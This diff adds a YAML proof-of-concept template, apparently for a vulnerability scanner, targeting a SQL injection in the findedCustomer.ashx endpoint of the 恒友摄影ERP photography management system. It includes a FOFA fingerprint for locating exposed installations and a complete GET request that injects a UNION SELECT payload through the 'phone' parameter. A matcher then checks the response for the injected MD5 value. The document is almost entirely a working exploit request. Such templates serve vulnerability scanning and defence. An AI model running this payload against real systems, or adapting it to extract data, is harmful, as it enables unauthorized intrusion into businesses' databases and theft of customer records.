@@ -1,0 +1,26 @@
+id: poc-yaml-hengyousoft-erp-findedcustomer-ashx-sqli
+info:
+  name: 恒友摄影ERP findedCustomer.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 恒友摄影ERP
+  fofa: body="BookChooseDateOrder.html"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /ashx/findedCustomer.ashx?Method=InitPage&UserID=20130107155124520&ShopID=F0&name=1&phone=%27)+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+wzLJ
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"ChildName\":") &&
+
+    contains(body,"\"ID\":") &&
+
+    contains(body,"0x" + t2) &&
+
+    !contains(body,"<html")
+
+    '
+transport: http
